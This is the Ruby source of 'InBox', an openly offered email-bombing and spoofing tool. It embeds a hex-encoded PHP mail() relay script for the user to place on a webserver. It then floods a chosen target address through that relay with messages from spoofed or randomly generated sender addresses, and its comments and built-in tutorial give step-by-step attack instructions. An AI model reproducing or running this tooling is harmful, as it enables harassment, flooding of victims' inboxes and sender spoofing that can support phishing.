=begin
         _          _          _             _               _     _      _         _
        /\ \       /\ \       /\ \     _    / /\            /\ \ /_/\    /\ \     / /\
       /  \ \__    \ \ \     /  \ \   /\_\ / /  \          /  \ \\ \ \   \ \_\ __/ /  \
      / /\ \___\   /\ \_\   / /\ \ \_/ / // / /\ \        / /\ \ \\ \ \__/ / //___/ /\ \
     / / /\/___/  / /\/_/  / / /\ \___/ // / /\ \ \      / / /\ \ \\ \__ \/_/ \___\/\ \ \
    / / /        / / /    / / /  \/____// / /\ \_\ \    / / /  \ \_\\/_/\__/\        \ \ \
   / / /        / / /    / / /    / / // / /\ \ \___\  / / /   / / / _/\/__\ \        \ \ \
  / / /        / / /    / / /    / / // / /  \ \ \__/ / / /   / / / / _/_/\ \ \        \ \ \
  \ \ \__  ___/ / /__  / / /    / / // / /____\_\ \  / / /___/ / / / / /   \ \ \     __/ / /
   \ \___\/\__\/_/___\/ / /    / / // / /__________\/ / /____\/ / / / /    /_/ /    /___/ /
    \/___/\/_________/\/_/     \/_/ \/_____________/\/_________/  \/_/     \_\/     \___\/

=end

=begin
  "InBox ~~ A Box of Tools for Destroying Inboxes"

  This isn't your backdoored vbscript skiddie shit. It requires
  a webserver so don't think you can just run the script
  and start spamming. I could setup a public webserver for
  people to use but I'm trying to repel skidds, not make it
  easy for them.

  Note: This is a spin off of my program LightDaFuse but this has more
  features and is more compact. I'm compacting this entire project into
  one single file for ease of use.
=end

=begin
  +-------------------------+-------------------------------------------+
  | Name                    | Information                               |
  +-------------------------+-------------------------------------------+
  | Program Name:           | [InBox]                                   |
  +-------------------------+-------------------------------------------+
  | Author:                 | r00tshine                                 |
  +-------------------------+-------------------------------------------+
  | Programming Language:   | Ruby                                      |
  +-------------------------+-------------------------------------------+
  | Reason:                 | To be an easy, compact, safe and reliable |
  |                         | email attack program. Not you VBScript    |
  |                         | skiddie shit.                             |
  +-------------------------+-------------------------------------------+
=end

=begin
  If the prgram crashes that means that you can't connect to the WebServer. If this
  occurs that means that you are having trouble connecting to the webserver and it
  would be in you best interest to employ a greater delay time or to use a better webserver.
  If the target's email service provider notices a large amount of emails from your webserver
  they will likeley block it or most emails will go to spam.
=end

=begin
  How to Get Emails:
    Unlike many email spammers, this requires not email account,
    no SMTP login, nothing. Just a WebServer that allows the PHP mail()
    function with the InBox PHP script on it. Before attacking you need a
    list of emails. Don't fret, I have added an email generator to this
    program so you don't have to hand make a list of email addresses.
    To use this just run InBox using `ruby InBox.rb`. Once the program
    is running type `generate/generator/g/gen` then choose `list` to create
    an email list, or `single` to generate a single email address. If you choose
    list you have to choose between a randmized or custom list using the commadns `random`
    and `custom`. You will be asked to fill out some information and after that
    a list will be generated.

  How to Attack:
    1.) Run the program in terminal using the command `ruby InBox.rb`
    2.) Type `start`
    3.) Type `build`
    4.) Choose an output filename
    5.) Put the output file on your WebServer
    6.) Run the program again and instead of typing `build` type `attack`
    7.) Choose an attack type and the rest is easy
=end

class String
  def blue;           "\033[34;1m#{self}\033[0m" end
end

# Includes
require "open-uri"
require "securerandom"

# Global Variables
prog_name_hex = "5b496e426f785d"
$prog_name = ["#{prog_name_hex}"].pack('H*').blue

@php_script_hex = [
            "3c3f7068700a092f2f204865616465720a096563686f2022496e000000000000000000000000",
            "426f782050485020536372697074223b0a0a092f2f20446566696e0000000000000000000000",
            "65205661726961626c65730a20202466726f6d203d20245f4745545b00000000000000000000",
            "2766726f6d275d3b0a202024746f203d20245f4745545b27746f275d00000000000000000000",
            "3b0a2020247375626a656374203d20245f4745545b0000000000000000000000000000000000",
            "277375626a656374275d3b0a2020246d657373616765203d0000000000000000000000000000",
            "20245f4745545b276d657373616765275d3b0a20200000000000000000000000000000000000",
            "2468656164657273203d20224d494d452d56657273696f6e3a20312e3022202e200000000000",
            "225c725c6e223b0a202024686561646572732000000000000000000000000000000000000000",
            "2e3d2022436f6e74656e742d747970653a746578742f00000000000000000000000000000000",
            "68746d6c3b636861727365743d69736f2d383835392d3122202e200000000000000000000000",
            "225c725c6e223b0a20202468656164657273202e3d202246726f6d3a20000000000000000000",
            "2466726f6d223b0a0a092f2f2043616c6c206d61696c20000000000000000000000000000000",
            "66756e6374696f6e0a096d61696c2824746f2c20247375626a6563742c200000000000000000",
            "246d6573736167652c20246865616465727329206f722064696528224572726f7222293b0a00",
            "20206563686f202253756363657373223b0a3f3e0a0000000000000000000000000000000000"
          ]
$php_script = @php_script_hex.join('')

@welcome_message_hex = [
                          "202020202020205f202020202020202020205f202020202020202020205f20202020202020202020",
                          "20205f2020202020202020202020202020205f202020205f2020202020205f000000000000000000",
                          "20202020202020205f20202020202020200a2020202020202f5c205c202020202020202f5c205c00",
                          "202020202020202f5c205c20202020205f2020202f202f5c2020202020202020202020202f5c2000",
                          "5c2f5f2f5c202020202f5c205c202020202f202f5c202020202020200a20202020202f20205c2000",
                          "5c5f5f202020205c205c205c20202020202f20205c205c2020202f5c5f5c2f202f20205c20202000",
                          "202020202020202f20205c205c205c205c2020205c205c5f5c5f5f2f202f20205c20202020202000",
                          "0a202020202f202f5c205c5f5f5f5c2020202f5c205c5f5c2020202f202f5c205c205c5f2f202f00",
                          "202f202f202f5c205c20202020202020202f202f5c205c205c205c205c5f5f2f202f202f5f5f5f00",
                          "2f202f5c205c20202020000000000000000000000000000000000000000000000000000000000000",
                          "200a2020202f202f202f5c2f5f5f5f2f20202f202f5c2f5f2f20202f202f202f5c205c5f5f5f2f00",
                          "202f202f202f5c205c205c2020202020202f202f202f5c205c205c205c5f5f205c2f5f2f5c5f5f00",
                          "5f5c2f5c205c205c202020200a20202f202f202f20202020202020202f202f202f202020202f2000",
                          "2f202f20205c2f5f5f5f5f2f202f202f5c205c5f5c205c202020202f202f202f20205c205c5f5c00",
                          "2f5f2f5c5f5f2f5c202020202020205c205c205c2020200a202f202f202f20202020202020202f00",
                          "202f202f202020202f20000000000000000000000000000000000000000000000000000000000000",
                          "2f202f202020202f202f202f202f202f5c205c205c5f5f5f5c20202f202f202f2020202f202f2000",
                          "2f5f2f5c2f5f5f5c205c202020202020205c205c205c20200a2f202f202f20202020202020202f00",
                          "202f202f202020202f202f202f202020202f202f202f202f202f20205c205c205c5f5f2f202f2000",
                          "2f202f2020202f202f202f2f205f2f5f2f5c205c205c202020202020205c205c205c200a5c205c00",
                          "205c5f5f20205f5f5f2f202f202f5f5f20202f202f202f202020202f202f202f202f202f5f5f5f00",
                          "5f5c5f5c205c20202f202f202f5f5f5f2f202f202f2f202f202f2020205c205c205c202020205f00",
                          "5f2f202f202f200a205c205c5f5f5f5c2f5c5f5f5c2f5f2f5f5f5f5c2f202f202f202020202f2000",
                          "2f202f202f202f5f5f5f5f5f5f5f5f5f5f5c2f202f202f5f5f5f5f5c2f202f2f202f202f20202000",
                          "202f5f2f202f2020202f5f5f5f2f202f20200a20205c2f5f5f5f2f5c2f5f5f5f5f5f5f5f5f5f2f00",
                          "5c2f5f2f20202020205c2f5f2f5c2f5f5f5f5f5f5f5f5f5f5f5f5f5f2f5c2f5f5f5f5f5f5f5f5f00",
                          "5f2f205c2f5f2f20202020205c5f5c2f202020205c5f5f5f5c2f2020200a20202020202020200000",
                          "20202020202020202020202020202020202020202020202020202020202020202020202020200000",
                          "20202020202020202020202020202020202020202020202020202020202020202020202020200000",
                          "202020200a0000000000000000000000000000000000000000000000000000000000000000000000"
                       ]
welcome_message_hex_joined = @welcome_message_hex.join('')
$welcome_message = ["#{welcome_message_hex_joined}"].pack('H*')

# Functions
def Exit_Func
  def Closing_Message
    print "#{$prog_name} Closing."
    sleep(0.5)
    print "."
    sleep(0.5)
    print ".\n"
  end

  def Closing_Function
    system("exit")
    exit
  end

  Closing_Message()
  Closing_Function()
end

def Send(url, email, target, subject, message)
  @data = URI.parse("#{url}?from=#{email}&to=#{target}&subject=#{subject}&message=#{message}").read
end

def Attack
  def List_Attack
    def Attack_Func(list, url, target, subject, message, amount)
      i = 0
      while i < amount
        i += 1
        email = File.readlines("#{list}").sample
        Send("#{url}", "#{email}", "#{target}", "#{subject}", "#{message}")
        puts "\t Email #{i}/#{amount} sent to #{target} from #{email}"
        sleep(timeout)
      end
    end

    print "#{$prog_name} Url to PHP script: "
    url = gets.chomp
    print "#{$prog_name} List of Email Addresses: "
    list = gets.chomp
    print "#{$prog_name} Number of Emails: "
    amount = gets.chomp.to_i
    print "#{$prog_name} Timeout (seconds): "
    timeout = gets.chomp.to_f
    print "#{$prog_name} Target Email Address: "
    target = gets.chomp
    print "#{$prog_name} Subject: "
    subject = gets.chomp
    print "#{$prog_name} Message: "
    message = gets.chomp

    Attack_Func("#{list}", "#{url}", "#{target}", "#{subject}", "#{message}", "#{amount}")
  end

  def Single_Email_Addr_Attack
    def Attack_Func(url, email, target, subject, message, amount)
      i = 0
      while i < amount
        i += 1
        Send("#{url}", "#{email}", "#{target}", "#{subject}", "#{message}")
        puts "\t Email #{i}/#{amount} sent to #{target} from #{email}"
        sleep(timeout)
      end
    end

    print "#{$prog_name} Url to PHP script: "
    url = gets.chomp
    print "#{$prog_name} Spoofed Email Address: "
    email = gets.chomp
    print "#{$prog_name} Target Email Address: "
    target = gets.chomp
    print "#{$prog_name} Number of Emails: "
    amount = gets.chomp.to_i
    print "#{$prog_name} Timeout (seconds): "
    timeout = gets.chomp.to_f
    print "#{$prog_name} Subject: "
    subject = gets.chomp
    print "#{$prog_name} Message: "
    message = gets.chomp

    Attack_Func("#{url}", "#{email}", "#{target}", "#{subject}", "#{message}", "#{amount}")
  end

  def Spoofed_Email
    def Attack_Func(url, email, target, subject, message)
      Send("#{url}", "#{email}", "#{target}", "#{subject}", "#{message}")
      puts "\t Attack Email sent to #{target} from #{email}"
    end

    print "#{$prog_name} Url to PHP script: "
    url = gets.chomp
    print "#{$prog_name} Spoofed Email Address: "
    email = gets.chomp
    print "#{$prog_name} Target Email Address: "
    target = gets.chomp
    print "#{$prog_name} Subject: "
    subject = gets.chomp
    print "#{$prog_name} Message: "
    message = gets.chomp

    Attack_Func("#{url}", "#{email}", "#{target}", "#{subject}", "#{message}")
  end

  loop do
    print "#{$prog_name} Attack Type: "
    attack_type = gets.chomp

    if attack_type == "list"
      def On_List
        puts "#{$prog_name} Attack type set to list..."
        List_Attack()
        Exit_Func()
      end
      On_List()
    elsif attack_type == "single"
      def On_Single
        puts "#{$prog_name} Attack type set to single..."
        Single_Email_Addr_Attack()
        Exit_Func()
      end
      On_Single()
    elsif attack_type == "spoof"
      def On_Spoof
        puts "#{$prog_name} Attack type set to spoof..."
        Exit_Func()
      end
      On_Spoof()
    elsif attack_type == "exit"
      def On_Exit
        Exit_Func()
      end
      On_Exit()
    else
      def On_Invalid
        puts "#{$prog_name} Invalid attack type! Options include 'spoof', 'list' and 'single'.\n\tType 'exit' to exit."
      end
      On_Invalid()
    end
  end
end

def Email_Generator
  def Gen_List
    def Check_Exists(filename)
      if File.exist?(filename) == true
        puts "#{$prog_name} Removing current file named '#{filename}'"
        File.delete("#{Dir.pwd}/#{filename}")
        puts "#{$prog_name} Creating file named '#{filename}'"
      else
        puts "#{$prog_name} Creating file named '#{filename}'"
      end
    end

    def Custom
      def Create_List(list, filename, domain)
        output_list = open(filename, 'w')
        input_list = File.open(list, 'r')
        i = 0
        amount = File.foreach("#{list}").count
        input_list.each_line { |line|
          i += 1
          output_list.write("#{line.chomp}@#{domain}")
          output_list.write("\n")
          puts "\tEmail '#{line.chomp}@#{domain}' generated! (#{i}/#{amount})"
        }
        input_list.close
        output_list.close
      end

      print "#{$prog_name} Web Domain: "
      domain = gets.chomp
      print "#{$prog_name} Username List: "
      list = gets.chomp
      print "#{$prog_name} Output File: "
      filename = gets.chomp

      Check_Exists(filename)
      Create_List(list, filename, domain)
    end

    def Random
      def Create_List(filename, domain, amount, uname_len)
        i = 0
        open("#{filename}", 'a') do |f|
          while i < amount
            i += 1
            username = SecureRandom.urlsafe_base64(uname_len)
            f << "#{username}@#{domain}\n"
            puts "\tEmail '#{username}@#{domain}' generated! (#{i}/#{amount})"
          end
        end
        puts "#{$prog_name} Output emails stored to '#{filename}'"
      end

      print "#{$prog_name} Web Domain: "
      domain = gets.chomp
      print "#{$prog_name} Amount of Email Addresses: "
      amount = gets.chomp.to_i
      print "#{$prog_name} Length of Usernames: "
      uname_len = gets.chomp.to_i
      print "#{$prog_name} Output File: "
      filename = gets.chomp

      Check_Exists(filename)
      Create_List(filename, domain, amount, uname_len)
    end

    loop do
      print "#{$prog_name} List Type: "
      email_type = gets.chomp.downcase

      if email_type == "random"
        def On_Random
          Random()
          Exit_Func()
        end
        On_Random()
      elsif email_type == "custom"
        def On_Custom
          Custom()
          Exit_Func()
        end
        On_Custom()
      elsif email_type == "exit"
        def On_Exit
          Exit_Func()
        end
        On_Exit()
      else
        puts "#{$prog_name} Invalid list type! Options include 'random' and 'custom'.\n\tType 'exit' to exit."
      end
    end
  end

  def Gen_Single
    def Make_Email(domain, uname_len)
      username = SecureRandom.urlsafe_base64(uname_len-1)
      puts "\tOutput: #{username}@#{domain}"
    end

    print "#{$prog_name} Web Domain: "
    domain = gets.chomp
    print "#{$prog_name} Username Length: "
    uname_len = gets.chomp.to_i

    Make_Email(domain, uname_len)
    Exit_Func()
  end

  loop do
    print "#{$prog_name} Generation Type: "
    gen_type = gets.chomp.downcase

    if gen_type == "list"
      def On_List
        Gen_List()
        Exit_Func()
      end
      On_List()
    elsif gen_type == "single"
      def On_Single
        Gen_Single()
        Exit_Func()
      end
      On_Single()
    elsif gen_type == "exit"
      def On_Exit
        Exit_Func()
      end
      On_Exit()
    else
      def On_Invalid
        puts "#{$prog_name} Invalid generation type! Options include 'list' and 'single'.\n\tType 'exit' to exit."
      end
      On_Invalid()
    end
  end
end

def Tutorial
  def Setup_Tutorial
    def Setup_Tutorial_Output
      puts "#{$prog_name} Setup Tutorial: "
      puts "\t\t1.) Run the program using the command `ruby InBox.rb`"
      puts "\t\t2.) Type in the command 'start' or 's'"
      puts "\t\t3.) Type in the command 'build'"
      puts "\t\t4.) Follow the instructions to generate a PHP script"
      puts "\t\t5.) Put the generated PHP script on your WebServer"
      puts "\t\t6.) Next, follow the instructions in the attack tutorial to start"
    end
    Setup_Tutorial_Output()
  end

  def Attack_Tutorial
    def Attack_Tutorial_Output
      puts "#{$prog_name} Attack_Tutorial: "
      puts "\t\t1.) Follow the instructions in the setup tutorial."
      puts "\t\t2.) Run the program using the command `ruby InBox.rb`"
      puts "\t\t3.) Type in the command 'start' or 's'"
      puts "\t\t4.) Type in the command 'attack'"
      puts "\t\t5.) Choose either 'spoof', 'list' or 'single' attack type"
      puts "\t\t6.) You will be asked to fill out some information."
      puts "\t\t    Once that is done the attack will start!"
    end
    Attack_Tutorial_Output()
  end

  loop do
    print "#{$prog_name} Select Tutorial: "
    tutorial_type = gets.chomp.downcase

    if tutorial_type == "attack"
      def On_Attack
        Attack_Tutorial()
      end
      On_Attack()
    elsif tutorial_type == "setup"
      def On_Setup
        Setup_Tutorial()
      end
      On_Setup()
    elsif tutorial_type == "exit"
      def On_Exit
        Exit_Func()
      end
      On_Exit()
    else
      def On_Invalid
        puts "#{$prog_name} Invalid tutorial type! Options include 'attack' and 'setup'.\n\tType 'exit' to exit."
      end
      On_Invalid()
    end
  end
end

def Build
  def Create_File
    print "#{$prog_name} PHP Output Filename: "
    filename = gets.chomp.downcase

    if filename.include? ".php"
      File.write("#{filename}", ["#{$php_script}"].pack('H*'))
      puts "#{$prog_name} File saved as '#{filename}'"
    else
      File.write("#{filename}.php", ["#{$php_script}"].pack('H*'))
      puts "#{$prog_name} File saved as '#{filename}.php'"
    end
  end
  Create_File()
end

def Attack_Test
  def Send_Test_Email(test_email, url)
    from = "fuel.da@fla.me"
    subject = "[InBox] Test Email"
    message = "If you recieved this email [InBox] is setup correctly. %0AYou are now able to start attacking... %0AHave fun!"
    Send(url, from, test_email, subject, message)
    puts "#{$prog_name} Test email sent to #{$test_email}"
  end

  print "#{$prog_name} Url to PHP Script: "
  url = gets.chomp
  print "#{$prog_name} Target Email Address: "
  test_email = gets.chomp

  Send_Test_Email("#{test_email}", "#{url}")
end

def Welcome_Msg
  print "#{$welcome_message}".blue
end

def Clear
  def Linux_Clear
    system('clear')
  end
  def Other_Clear
    system('cls')
  end
  Other_Clear() or Linux_Clear()
end

def Before_Start
  print "\e[8;20;110t"
  Clear()
  Welcome_Msg()
end

# Main
Before_Start()

loop do
  print "#{$prog_name} Enter a command: "
  command = gets.chomp.downcase

  if command == "start" || command == "s"
    def Start_Function
      def Start
        def Mode_Call(mode)
          if mode == "build"
            def On_Build
              puts "#{$prog_name} Mode set to build..."
              Build()
              Exit_Func()
            end
            On_Build()
          elsif mode == "attack"
            def On_Attack
              puts "#{$prog_name} Mode set to attack..."
              Attack()
              Exit_Func()
            end
            On_Attack()
          elsif mode == "test"
            def On_Test
              puts "#{$prog_name} Mode set to attack..."
              Attack_Test()
              Exit_Func()
            end
            On_Test()
          elsif mode == "exit"
            def On_Exit
              Exit_Func()
            end
            On_Exit()
          else
            def On_Invalid
              puts "#{$prog_name} Invalid mode! Choose either 'build', 'test' or 'attack'. \n\tType 'exit' to exit."
            end
            On_Invalid()
          end
        end

        loop do
          def Select_Mode
            print "#{$prog_name} Mode: "
            mode = gets.chomp.downcase
            Mode_Call(mode)
          end
          Select_Mode()
        end
      end
      Start()
    end
    Start_Function()
  elsif command == "how" || command == "tutorial" || command == "tut" || command == "howto" || command == "instructions"
    def Tut_Function
      Tutorial()
    end
    Tut_Function()
  elsif command == "generate" || command == "generator" || command == "gen" || command == "g"
    def Gen_Function
      Email_Generator()
    end
    Gen_Function()
  elsif command == "help" || command == "h"
    def Help_Function
      puts "#{$prog_name} Help list:"
      puts "\t\thelp/h: Displays a list of commands"
      puts "\t\tstart/s: Start the program"
      puts "\t\tgenerate/generator/gen/g: Generate an email address, or list of email addresses"
      puts "\t\ttutorial/tut/how/howto/instructions: Displays instructions on how to use the program "
      puts "\t\tinfo/i: Display information about the program"
      puts "\t\tquit/exit/e/q: Close out of the program"
    end
    Help_Function()
  elsif command == "info" || command == "i"
    def Info_Function
      puts "#{$prog_name} Program Information:"
      puts "\t\tName: InBox"
      puts "\t\tReason: To be a working, safe and reliable EMail attack program."
      puts "\t\tAuthor: r00tshine"
      puts "\t\tLanguage: English"
      puts "\t\tProgramming Language: Ruby"
    end
    Info_Function()
  elsif command == "exit" || command == "quit" || command == "q" || command == "e"
    def Exit_Function
      Exit_Func()
    end
    Exit_Function()
  else
    def Else_Function
      puts "#{$prog_name} Invalid command! Type 'help' or 'h' for a list of commands."
    end
    Else_Function()
  end
end
